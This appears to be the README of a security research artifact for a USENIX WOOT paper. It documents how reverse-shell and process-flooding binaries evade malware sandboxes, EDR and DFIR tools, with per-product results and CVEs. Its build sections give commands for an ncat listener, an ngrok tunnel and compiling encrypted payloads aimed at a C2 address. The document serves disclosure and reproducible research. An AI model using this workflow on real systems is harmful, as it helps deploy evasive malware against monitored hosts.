# PoC-Evidence-WOOT Artifact

## Overview

This repository contains the research artifact accompanying the accepted paper submitted to USENIX WOOT.

The artifact includes:

- Proof-of-concept (PoC) implementations
- Source code
- Precompiled demonstration binaries
- Sandbox analysis logs
- HAR captures from public malware-analysis platforms
- Reproduction instructions for the vulnerabilities and behaviors discussed in the paper

The repository is intended exclusively for academic research, defensive security evaluation, and artifact reproducibility.

---

## Requested Artifact Evaluation (AE) Badges

This artifact is submitted for the following AE badges:

- Artifact Available
- Artifact Functional
- Results Reproduced

The repository contains all materials necessary to:

- inspect the evidence presented in the paper,
- reproduce the demonstrated behaviors,
- rebuild the included binaries,
- and validate the sandbox observations discussed in the manuscript.

---

## IMPORTANT SAFETY WARNING

> **WARNING**
>
> This repository contains:
> - reverse-shell demonstrations,
> - process-flooding PoCs,
> - recursive process spawning,
> - resource exhaustion demonstrations,
> - telemetry flooding techniques,
> - and binaries that may be flagged by security products.
>
> Although these artifacts are provided strictly for research purposes, several binaries intentionally exhibit malware-like behavior as part of the evaluation methodology described in the paper.

### DO NOT:
- execute binaries on a host operating system,
- run samples on production infrastructure,
- expose test systems to the public Internet,
- execute binaries outside isolated virtual machines or sandbox environments.

### RECOMMENDED EXECUTION ENVIRONMENT

All executable demonstrations should only be evaluated inside:

- isolated virtual machines,
- disposable lab environments,
- offline sandbox infrastructure,
- or intentionally segmented research networks.

| Artifact Component        | Purpose                            | Execution Required | Safety Level      |
|---------------------------|------------------------------------|--------------------|-------------------|
| `cape_logs/`              | CAPE execution evidence            | No                 | Safe (read-only)  |
| `cuckoo_logs/`            | Cuckoo execution evidence          | No                 | Safe (read-only)  |
| `har_files/`              | Online sandbox traces              | No                 | Safe (read-only)  |
| `recursive_spawn/`        | Process recursion PoC              | Yes (optional)     | VM-only           |
| `recursive_ps_wazuh/`     | Wazuh telemetry exhaustion + shell | Yes                | High-risk VM-only |
| `recursive_velociraptor/` | Velociraptor pstree failure PoC    | Yes                | VM-only           |
| `vathos_demo/`            | Base payload generation demo       | Yes (optional)     | VM-only           |
| `vathos_eicar/`           | EICAR retrieval variant            | Yes (optional)     | VM-only           |
| `vathos_rev/`             | Reverse-shell variant              | Yes                | High-risk VM-only |

Examples:

```bash
cat cape_logs/report.json | jq .
cat cuckoo_logs/report.json | jq .
file har_files/*.har
```

### Optional Build Verification (SAFE)

Reviewers may verify compilation without executing binaries.

Example:

```bash
x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 onion.c -o test.exe
```

This step validates reproducibility of the binaries without launching them.

### Optional Dynamic Reproduction (UNSAFE / VM ONLY)

Execution of:

- `.exe` files,
- reverse-shell payloads,
- recursive spawning demonstrations,
- or telemetry flooding samples

**MUST ONLY occur inside isolated virtual machines.**

See the per-directory sections below for exact reproduction workflows.

---

## One-Command Smoke Test

The following command performs a non-executing structural verification:

```bash
find . -type f | sort
```

Recommended extended smoke test:

```bash
find . -name "*.json" -exec jq empty {} \; && \
find . -name "*.har" -type f && \
find . -name "*.exe" -type f && \
find . -name "*.c" -type f && \
echo "[+] Artifact structure verified successfully"
```

This command:

- validates JSON syntax,
- verifies expected HAR files exist,
- verifies binaries exist,
- verifies source files exist,
- and avoids executing any payloads.

---

## Artifact–Paper Mapping

The table below maps the paper's main claims and per-product results (Section 5) to the
corresponding artifact subdirectory and recommended reproduction workflow.

### Tested Environments

| Environment                     | Type                 | Version / Commit                      | Attack | CVE               | Artifact Directory                                 |
|---------------------------------|----------------------|---------------------------------------|--------|-------------------|----------------------------------------------------|
| Bitdefender GravityZone EDR     | EDR                  | Proprietary                           | ✗      | —                 | `har_files/`                                       |
| Bitdefender GravityZone Sandbox | Malware sandbox      | Proprietary                           | ●      | —                 | `har_files/`                                       |
| Malwation Threat Zone           | Malware sandbox      | Cloud                                 | ●      | —                 | `har_files/`                                       |
| CAPEv2                          | Malware sandbox      | Commit `52e4b43`                      | ✓      | CVE-2025-61301    | `cape_logs/`, `vathos_demo/`, `recursive_spawn/`   |
| sandbox.pikker.ee               | Malware sandbox      | Cuckoo v2.0.7                         | ✓      | Pending           | `cuckoo_logs/`, `recursive_spawn/`, `vathos_demo/` |
| cuckoo.cert.ee                  | Malware sandbox      | Cuckoo v2.0.7                         | ✓      | Pending           | `cuckoo_logs/`, `recursive_spawn/`, `vathos_demo/` |
| Cuckoo 3                        | Malware sandbox      | `0.10.0-51-gad46ffe`                  | ✓      | Pending           | `cuckoo_logs/`, `recursive_spawn/`, `vathos_demo/` |
| Kaspersky EDR                   | EDR                  | Proprietary                           | ✗      | —                 | `har_files/`                                       |
| Microsoft Defender              | EDR                  | Proprietary                           | ✗      | —                 | `har_files/`                                       |
| ANY.RUN                         | Malware sandbox      | Cloud                                 | ●      | —                 | `har_files/`                                       |
| Recorded Future Triage          | Malware sandbox      | Cloud                                 | ✓      | CVE-2025-61303    | `har_files/`                                       |
| Velociraptor                    | DFIR platform        | `0.74.1` (Go `1.23.2`, commit `7e3ae67d3`) | ✓ | —                 | `recursive_velociraptor/`                          |
| VirusTotal                      | Multiscan aggregator | Cloud                                 | ✓      | —                 | `har_files/`                                       |
| WatchGuard EDPR                 | EDPR                 | Proprietary                           | ✗      | —                 | `har_files/`                                       |
| Wazuh                           | EDR / SIEM           | `4.12.0-rc1`                          | ✓      | —                 | `recursive_ps_wazuh/`                              |
| Hybrid Analysis                 | Malware sandbox      | Cloud                                 | ●      | —                 | `har_files/`                                       |
| OPSWAT MetaDefender             | Malware sandbox      | Cloud                                 | ●      | —                 | `har_files/`                                       |
| Comodo Valkyrie                 | Malware sandbox      | Cloud                                 | ●      | —                 | `har_files/`                                       |
| orjson                          | Serialization library| `3.11.4`                              | ✓      | CVE-2025-67221    | —                                       |

**Legend:** ✓ = Successfully evaded / attack confirmed · ✗ = Not bypassed · ● = Partial / inconclusive

### HAR Files — Priority Claim

The `har_files/` directory contains browser-captured HAR exports from sessions with all
cloud and proprietary platforms listed above. These files serve as timestamped evidence that
the Vathos malware family samples were submitted to these platforms by the authors, establishing
priority of discovery. Reviewers do not need to re-upload samples; the existing HARs are
sufficient for this claim.

To upload independently and reproduce the online-platform results, submit either
`vathos_demo.exe` or `recursive_spawn.exe` to any of the cloud platforms above and compare
behavioral reports.

### Failure-Mode Taxonomy (Section 5) — Directory Mapping

| Failure Mode                                  | Relevant Directory                                              |
|-----------------------------------------------|-----------------------------------------------------------------|
| Process-tree collection exhaustion            | `recursive_velociraptor/`, `recursive_ps_wazuh/`               |
| Telemetry flooding / monitoring blind spots   | `recursive_ps_wazuh/`                                          |
| Sandbox evasion via layered encryption        | `vathos_demo/`, `vathos_rev/`, `vathos_eicar/`                 |
| Reverse-shell stealthy execution              | `vathos_rev/`, `recursive_ps_wazuh/`, `recursive_velociraptor/`|
| Priority evidence (first-submission claim)    | `har_files/`                                                   |
| Static sandbox log evidence                   | `cape_logs/`, `cuckoo_logs/`                                   |

---

## VM / Network Safety Requirements & Dynamic Run Guidelines

> This section is **mandatory reading** before executing any artifact dynamically.

### Minimum VM Specifications

Due to the recursive nature of the process-spawning demonstrations, under-resourced VMs
**will crash or become unresponsive** before meaningful results are observable.

| Resource    | Minimum              | Recommended                       |
|-------------|----------------------|-----------------------------------|
| RAM         | 4 GB                 | 8 GB+                             |
| CPU cores   | 2                    | 4                                 |
| Disk space  | 40 GB                | 60 GB+                            |
| OS          | Windows 10 x64       | Windows 10 x64 (clean snapshot)   |
| Network     | Host-only or NAT     | Host-only (preferred)             |

**Always take a VM snapshot before any dynamic run.** This allows instant rollback without
reprovisioning the entire environment.

**Start with `recursive_spawn.exe`** if you want to validate process-tree behavior without
any reverse-shell component. It is the lowest-risk dynamic test in the artifact.

### Stopping & Cleaning Up a Run

Cleanup procedure depends on which platform or tool is under test. Each platform has its own
mechanisms - follow the platform's own documented workflow. General guidance per category is
below.

#### Sandbox Platforms (CAPE, Cuckoo)

These platforms manage task lifecycle automatically. A submitted sample runs within its
configured analysis timeout and terminates on its own. After the run:

1. Retrieve logs and reports from the sandbox web UI.
2. Revert the analysis VM to its clean snapshot via the sandbox's built-in mechanism.
3. Do **not** manually kill sandbox VMs mid-analysis unless the host is at risk — incomplete
   runs produce incomplete logs.

Refer to the CAPE and Cuckoo documentation for snapshot management and task cleanup.

#### Velociraptor

After running `recursive_velociraptor.exe`:

1. Kill the process tree from the Velociraptor server UI by terminating the spawned artifact collection.
2. On the VM, open Task Manager and end any remaining `recursive_velociraptor.exe` processes.
3. Revert the VM to the pre-run snapshot.
4. On the Velociraptor server, cancel or clear the affected hunt/collection.

#### Wazuh

After running `recursive_ps_demo.exe`:

1. If the system is still responsive, kill the process from Task Manager or via:
```powershell
   Stop-Process -Name "recursive_ps_demo" -Force
```
2. Close any active listener on the host.
3. Revert the VM to the pre-run snapshot.
4. On the Wazuh manager, clear or archive the flooded alerts to restore normal agent
   communication. Refer to the Wazuh documentation for alert and agent management.

#### Online / Cloud Platforms (AnyRun, Triage, VirusTotal, etc.)

These platforms run samples in their own isolated infrastructure. No local cleanup is required.
After submission, wait for the analysis report to complete on the platform's side.

#### General Fallback

If a VM becomes unresponsive during any dynamic run:

1. **Do not attempt to recover the running VM.** Force-power it off from the hypervisor.
2. Revert to the pre-run snapshot immediately.
3. Do not copy any files out of an in-progress or crashed VM.
4. Re-run with reduced depth or timeout parameters if the crash occurred before results
   were observable.

### Quick Safety Checklist Before Any Dynamic Run

- [ ] VM snapshot taken immediately before execution
- [ ] Network set to host-only or NAT with outbound firewall rules applied
- [ ] RAM confirmed at 4 GB minimum (8 GB recommended for `recursive_ps_wazuh`)
- [ ] Listener active on isolated host before launching network-capable samples
- [ ] Depth and timeout parameters set within recommended limits
- [ ] Antivirus on host machine will not scan shared/NAT-accessible paths
- [ ] Clipboard and shared folder integration disabled in hypervisor settings

---

## Per-Product Vulnerability Details & Public Evidence

---

### Any.Run

**Product:** Any.Run Malware Analysis Platform  
**Type:** Dynamic Behavioral Sandbox (Windows environment)  
**Sample SHA-256:** `3C52178C27D2A0336F6286F6CF0A4A253A507273B1A19303EDCACB39D2659A4B`  
**Public Report:** [https://app.any.run/tasks/480a6f3f-766a-4b57-b91a-0dd715c384f4](https://app.any.run/tasks/480a6f3f-766a-4b57-b91a-0dd715c384f4)  

---

### Comodo Valkyrie

**Product:** Comodo Valkyrie Cloud Analysis Platform  
**Type:** Static & Dynamic Analysis (Windows PE32+ behavioral engine)  
**Sample MD5:** `dca2fc8f69f6493c7a9c1ce9a68b2454`  
**Public Report:** [https://valkyrie.comodo.com/get_info?sha1=9b4688ba4788e34bce47d91b0accc98d33dbf8d2](https://valkyrie.comodo.com/get_info?sha1=9b4688ba4788e34bce47d91b0accc98d33dbf8d2)  

---

### OPSWAT MetaDefender / FileScan.io

**Product:** OPSWAT MetaDefender Cloud / FileScan.io Sandbox  
**Type:** Dynamic Analysis (Windows PE32+ behavior engine)  
**Sample SHA-256:** `3c52178c27d2a0336f6286f6cf0a4a253a507273b1a19303edcacb39d2659a4b`  
**Public Report:** [https://www.filescan.io/uploads/68796c707bc45bdee1b03656/reports/2df546b1-0162-4d6c-887e-bd5f54249eaa/overview](https://www.filescan.io/uploads/68796c707bc45bdee1b03656/reports/2df546b1-0162-4d6c-887e-bd5f54249eaa/overview)  

---
### Cuckoo 2 - Public Instance (sandbox.pikker.ee) -- Online Samples have been deleted from the platform 

**Version:** Cuckoo v2.0.7 / `0.10.0-51-gad46ffe`  
**CVE:** pending 

| Scenario                       | Result                                              | Report                                                                              |
|--------------------------------|-----------------------------------------------------|-------------------------------------------------------------------------------------|
| 200s timeout                   | EICAR dropped, score 0.3/10, no processes recorded  | [Report](https://sandbox.pikker.ee/analysis/6729018/summary/)                       |
| 300s timeout                   | Reverse shell triggered, no behavior logs           | [Report](https://sandbox.pikker.ee/analysis/6741566/summary/)                       |
| 300s no timeout enforcement    | Same result, empty behavior tab                     | [Report](https://sandbox.pikker.ee/analysis/6741656/summary/)                       |

To verify the reverse shell behavior independently, have a listener active on the specified
port before launching the sample. In a functioning sandbox or runtime environment, the
connection attempt would be visible - in these cases it is not, due to the denial-of-analysis
behavior.

---

### Cuckoo 3
## Reproduction
Follow reproduction instructions from this repository:
https://github.com/eGkritsis/Cuckoo-Vulnerability

---

### Malwation Threat Zone -- Online Sample has been deleted from the platform

**Product:** Threat Zone Sandbox  
**Type:** Dynamic and Static Behavioral Engine  
**Sample SHA-256:** `3c52178c27d2a0336f6286f6cf0a4a253a507273b1a19303edcacb39d2659a4b`  
**Public Report:** [https://app.threat.zone/submission/a3613e51-24c7-448c-a37f-66b70c0f2170/overview](https://app.threat.zone/submission/a3613e51-24c7-448c-a37f-66b70c0f2170/overview)  (Sample has been removed from the platform)

---

### Hatching Triage

**Product:** Hatching Triage Sandbox Platform  
**Type:** Dynamic Analysis (Windows behavioral engine)  
**CVE:** CVE-2025-61303  
**Sample SHA-256:** `3c52178c27d2a0336f6286f6cf0a4a253a507273b1a19303edcacb39d2659a4b`  
**Public Report:** [https://tria.ge/250717-1nz1zasnw9](https://tria.ge/250717-1nz1zasnw9)  

---

### CrowdStrike Falcon Sandbox (Hybrid Analysis)

**Product:** CrowdStrike Falcon  
**Platform:** Falcon Sandbox / Hybrid Analysis  
**Artifact:** `vathos_demo/`  
**Type:** Malware sandbox / dynamic analysis platform  
**Sample SHA-256:** `3c52178c27d2a0336f6286f6cf0a4a253a507273b1a19303edcacb39d2659a4b`  
**Public Report:** https://hybrid-analysis.com/sample/3c52178c27d2a0336f6286f6cf0a4a253a507273b1a19303edcacb39d2659a4b

---

### Velociraptor

**Product:** Velociraptor  
**Repository:** https://github.com/Velocidex/velociraptor  
**Ecosystem:** Go  
**Affected Versions:** `0.74.1`  
**Affected Artifact:** `Generic.System.Pstree`  
**Compiler:** `go1.23.2`  
**Commit:** `7e3ae67d3`  
**Artifact Directory:** `recursive_velociraptor/`

## Summary of Failure Modes 

This artifact demonstrates two failure modes under recursive process-load conditions:

### (1) Process-tree serialization overflow
`Generic.System.Pstree` attempts to return the full process tree as a single JSON structure. Under deep recursive load, this causes:

- oversized JSON message generation  
- client memory pressure during transport  
- gRPC failure:

```text
received message larger than max (8732115 vs. 4194304)
```
Result: the data exists but becomes unrenderable in the UI layer.

### (2) Backend/UI visibility collapse

Even when raw process events are successfully collected, Velociraptor fails at the presentation layer due to:

- gRPC transport limits
- UI rendering constraints on large process graphs

Result: events are captured but operationally invisible to the analyst interface.

### Quick Reproduction Guide

#### VM-ONLY

Install Velociraptor 0.74.1 (client + server) on a Windows 10 x64 VM.
Enable artifact: Generic.System.Pstree.
Execute from recursive_velociraptor/:
recursive_velociraptor.exe <DEPTH> <SLEEP_MS> <IP> <PORT>

Recommended parameters:

- DEPTH=5000
- SLEEP_MS=1000
  
Observe:
- recursive process-tree explosion
- gRPC “message larger than max” failure
- loss of UI-level visibility despite successful event capture

---

### Wazuh

**Product:** Wazuh  
**Affected Versions:** `4.12.0-rc1` and possibly all previous versions  
**Patched Versions:** Not yet patched / no official patch available as of this disclosure  
**Artifact Directory:** `recursive_ps_wazuh/`

#### Manual Reproduction

> **VM-ONLY — requires manual environment setup.**

1. Provision a Windows 10 x64 VM with at least 8 GB RAM.
2. Install Wazuh `4.12.0-rc1` following the [official documentation](https://documentation.wazuh.com).
3. Ensure Sysmon is installed and Wazuh is actively collecting telemetry.
4. From `recursive_ps_wazuh/`, execute:

```bash
recursive_ps_demo.exe <max_depth> <flood_count> <flood_threads> <ip> <port>
```

Recommended: `max_depth=5000`, `flood_count=1000`, `flood_threads=10`.

5. Observe telemetry flooding, monitoring blind spots, and reverse-shell evasion as described
   in Section 5 of the paper.

---
### CAPEv2

**Project:** CAPEv2  
**Commit:** `52e4b43a2cb508d3483819042cf8e4d8348f3a05`  
**Artifact:** `cape_logs/`, `vathos_demo/`  
**Type:** Malware sandbox / behavioral analysis  


## Reproduction
Follow reproduction instructions from this repository:
https://github.com/eGkritsis/CVE-2025-61301

---

## Directory Descriptions

### `cape_logs/`

Contains static output logs and analysis artifacts generated from the CAPE sandbox environment.

Files include:
- execution logs,
- process traces,
- sandbox reports,
- behavioral observations.

> **SAFE TO INSPECT.** These files are passive evidence artifacts and are not executable.

---

### `cuckoo_logs/`

Contains static analysis outputs generated by the Cuckoo sandbox.

Includes:
- process logs,
- behavioral reports,
- PCAP captures,
- registry traces,
- task metadata,
- JSON analysis outputs.

> **SAFE TO INSPECT.** These files are passive forensic artifacts. The included PCAP and
> JSON files may reference malware-like behavior, suspicious domains, or reverse-shell activity,
> but they are not themselves executable.

---

### `har_files/`

This folder works as evidence of the first ever online uploads of the recursive attack on multiple known security solutions.

Contains HTTP Archive (HAR) files exported from browser sessions interacting with public
malware-analysis and sandbox services.

Platforms include:
- ANY.RUN
- Hybrid Analysis
- Threat.Zone
- Triage
- VirusTotal
- Filescan
- Comodo Valkyrie
- Pikker Sandbox

The HAR files capture HTTP requests, responses, timing data, and browser interaction metadata.

> **SAFE TO INSPECT.** HAR files are passive browser-export artifacts and are not executable
> payloads. Reviewers should inspect them locally and avoid replaying captured requests against
> production systems.

---

### `recursive_spawn/`

Contains a minimal recursive process-spawning proof of concept.

The implementation recursively spawns child processes to extreme depths:

```c
#define MAX_DEPTH 1000000
```

**Files:**
- `recursive_spawn.c`
- `recursive_spawn.exe`

> **LOW-RISK BUT VM-ONLY.** The binary is intentionally designed to exhaust
> process-management resources and may freeze systems, consume CPU/memory, or destabilize
> monitoring agents. **DO NOT RUN ON HOST SYSTEMS.**

---

### `recursive_velociraptor/`

Velociraptor-specific recursive process spawning demonstration targeting process-tree
collection and monitoring behavior.

**Files:**
- `recursive_spawn.c`
- `recursive_velociraptor.exe`
- `details.txt`

**Execution:**

```bash
recursive_velociraptor.exe <DEPTH> <SLEEP_MS> <IP> <PORT>
```

Recommended: `DEPTH=5000–10000`, `SLEEP_MS=1000–10000`. A listener must be active on the
specified port before launch.

> **VM-ONLY.** Includes reverse-shell behavior, network communication, and recursive
> process flooding. Use only in isolated lab environments.

---

### `recursive_ps_wazuh/`

Custom recursive process-spawning variation targeting Wazuh telemetry and behavioral monitoring.

Features include:
- recursive process spawning,
- PowerShell reverse shell execution,
- `cmd.exe` flooding,
- registry flooding,
- Sysmon/Wazuh event saturation.

**Files:**
- `recursive_ps_demo.c`
- `recursive_ps_demo.exe`
- `details.txt`

**Execution:**

```bash
recursive_ps_demo.exe <max_depth> <flood_count> <flood_threads> <ip> <port>
```

Recommended: `max_depth=5000`, `flood_count=1000`, `flood_threads=10`.

> **HIGH-RISK / VM-ONLY.** Demonstrates reverse-shell functionality, telemetry flooding,
> and monitoring evasion. Execution outside isolated research infrastructure is strongly
> discouraged.

---

### `vathos_demo/`

Demonstration implementation of the Vathos payload-generation mechanism.

**Files:**
- `encrypt.py`
- `onion.c`
- `vathos_demo.exe`
- `details.txt`

**Build Instructions:**

```bash
python3 encrypt.py -r <rounds> -k <key_length>

x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 -Wno-deprecated-declarations \
  onion.c -o vathos_demo.exe -Wl,-subsystem,windows

vathos_demo.exe <IP> <PORT>
```

> **VM-ONLY.** Includes network-capable payload behavior.

---

### `vathos_rev/`

Reverse-shell oriented Vathos demonstration.

**Files:**
- `encrypt_command.py`
- `onion.c`
- `vathos_rev.exe`
- `details.txt`

**Build Instructions:**

```bash
ncat -nvlkp 4444   # start listener first

# optional tunnel
ngrok tcp 4444

python3 encrypt_command.py -r <rounds> -k <key_length> -c <C2_IP> -p <C2_PORT>

x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 -Wno-deprecated-declarations \
  onion.c -o vathos_rev.exe -Wl,-subsystem,windows

vathos_rev.exe
```

> **HIGH-RISK / VM-ONLY.** Performs reverse-shell communication, outbound network
> connectivity, and command execution. Use exclusively in isolated research environments.

---

### `vathos_eicar/`

Vathos demonstration configured to retrieve the EICAR test payload.

**Files:**
- `encrypt_url.py`
- `onion.c`
- `vathos.exe`
- `details.txt`

**Build Instructions:**

Modify rounds, key length, and URL inside `encrypt_url.py`, then:

```bash
python3 encrypt_url.py

x86_64-w64-mingw32-clang --target=x86_64-w64-windows-gnu -O2 -Wno-deprecated-declarations \
  onion.c -o vathos_eicar.exe -Wl,-subsystem,windows

vathos_eicar.exe
```

> **VM-ONLY.** Although this variant targets the EICAR test artifact, it still demonstrates
> network-enabled payload behavior.

---

## Dependencies

**Recommended tooling:**
- `python3`
- `jq`
- `tree`
- `sha256sum`
- `clang`
- `mingw-w64`
- `x86_64-w64-mingw32-clang`

**Recommended OS:**
- Ubuntu 22.04+ (for building)
- Windows 10 x64 VMs (for runtime testing)

---

## Known Issues / Notes

- All dynamic demonstrations are intentionally noisy and may trigger antivirus products.
- Some samples intentionally generate stack overflows, process floods, excessive telemetry,
  reverse-shell activity, and monitoring instability.
- Dynamic execution is **NOT required** for basic AE validation.
  
---

## License

This artifact is released strictly for academic research, defensive evaluation, and
reproducibility purposes. A `LICENSE` file is included at the repository root.

---
